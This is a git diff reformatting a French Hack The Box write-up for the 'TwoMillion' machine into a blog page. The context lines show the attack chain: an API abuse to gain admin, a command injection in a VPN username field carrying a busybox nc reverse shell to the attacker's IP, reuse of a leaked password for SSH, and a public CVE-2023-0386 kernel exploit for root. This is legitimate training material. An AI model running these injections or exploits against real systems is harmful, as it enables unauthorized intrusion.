@@ -1,22 +1,23 @@
 ---
-tags:
-  - HTB
-  - machine
-date: 2025-11-24T19:26
-tasks:
-  - format
-parent file:
-  - 
-category:
-  - writeups
-  - htb
-difficulty: easy
-os: linux
+layout: writeup
 title: TwoMillion
 description: There are not so many writeups, are there?
-season: "8"
-seasonal: no
+excerpt: There are not so many writeups, are there?
+date: 2025-11-24T19:26
+platform: htb
+permalink: /writeups/htb/season8/twomillion/
+os: linux
+difficulty: easy
+season: '8'
+tags:
+- HTB
+- linux
+- easy
+prev_url: /writeups/htb/season8/outbound/
+next_url: /writeups/htb/season8/manage/
 ---
+
+{% raw %}
 
 # Foothold
 
@@ -25,7 +26,7 @@ First scan
 nmap -sCV -T4 $box -oN nmap.scan
 ```
 gives us
-![[Pasted image 20251124193107.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124193107.png" alt="TwoMillion" loading="lazy">
 
 On fait un ffuf, on filtre la sortie et on obtient quelques pages intéressantes.
 ```
@@ -34,13 +35,13 @@ ffuf -u http://$url/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/
 cat dirs.json | jq '.results[] | select(.status != 301) | {url:.url, status:.status}'
 ```
 
-![[Pasted image 20251124194439.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124194439.png" alt="TwoMillion" loading="lazy">
 
 On arrive sur la page `register` mais il nous faut un code d'invitation pour pouvoir se créer un compte.
-![[Pasted image 20251124194608.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124194608.png" alt="TwoMillion" loading="lazy">
 
 La page `invite`, elle, nous permet de tester un code d'invitation.
-![[Pasted image 20251124194657.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124194657.png" alt="TwoMillion" loading="lazy">
 
 On peut lire la fonction `inviteapi.min.js`
 ```
@@ -99,10 +100,10 @@ On trouve un endpoint `auth`.
 En faisant un fetch sur `/api/v1` on obtient une liste de 3 endpoints intéressants: `/api/v1/admin/auth`, `/api/v1/admin/vpn/generate` et `/api/v1/admin/settings/update`.
 
 Comme le tout est guidé on arrive assez vite à upgrade notre compte en admin.
-![[Pasted image 20251124212905.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124212905.png" alt="TwoMillion" loading="lazy">
 
 On se rend sur le dernier endpoint et on trouve qu'ils nous demandent un username. Comme le fichier ovpn doit sûrement être généré par une commande cmd, on se dit qu'il y a sûrement une rce possible, on tante de mettre comme nom "$(whoami)" et bingo, on voit "www-data" dans le certificat.
-![[Pasted image 20251124213511.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124213511.png" alt="TwoMillion" loading="lazy">
 
 Il ne nous reste plus qu'à lancer le listener et mettre comme nom 
 ```
@@ -111,7 +112,7 @@ $(busybox nc 10.10.14.11 4444 -e /bin/bash)
 
 Et bingo, on obtient le shell! (que l'on stabilise de suite)
 
-![[Pasted image 20251124213650.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124213650.png" alt="TwoMillion" loading="lazy">
 
 # Privilege Escalation to user
 
@@ -124,7 +125,7 @@ et on trouve rapidement un mot de passe:
 SuperDuperPass123
 ```
 
-![[Pasted image 20251124214033.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124214033.png" alt="TwoMillion" loading="lazy">
 
 On lit le fichier `.env`:
 ```
@@ -140,7 +141,7 @@ mysql -u admin -pSuperDuperPass123 -h localhost htb_prod -e "select * from users
 ```
 
 En fait pas besoin de se connecter à la db, on peut se connecter à l'utilisateur admin en ssh.
-![[Pasted image 20251124221907.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251124221907.png" alt="TwoMillion" loading="lazy">
 
 # PrivEsc to root
 
@@ -148,13 +149,13 @@ Les commandes classiques (`sudo -l`, suids, sgids) ne nous donnent rien, en reva
 ```
 find / -user admin 2>/dev/null
 ```
-![[Pasted image 20251125121333.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251125121333.png" alt="TwoMillion" loading="lazy">
 
 On trouve `/var/mail/admin`.
 
 Dans ce mail on nous dit que le kernel est vulnérable et en particulier celui dans OverlayFS/FUSE.
 
-![[Pasted image 20251125121455.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251125121455.png" alt="TwoMillion" loading="lazy">
 
 On trouve rapidement une CVE sur le web: `CVE-2023-0386`. On obtient le lien d'un github que l'on clone dans le dossier /tmp et on exécute les commandes de la CVE.
 https://github.com/puckiestyle/CVE-2023-0386
@@ -175,8 +176,9 @@ Et sur un autre terminal
 ```
 Et on obtient le root shell.
 
-![[Pasted image 20251125123054.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251125123054.png" alt="TwoMillion" loading="lazy">
 
 Et voilà, la box est finie.
 
-![[Pasted image 20251125123148.png]]
+<img class="content-image" src="/assets/content/htb/season8-twomillion/Pasted%20image%2020251125123148.png" alt="TwoMillion" loading="lazy">
+{% endraw %}
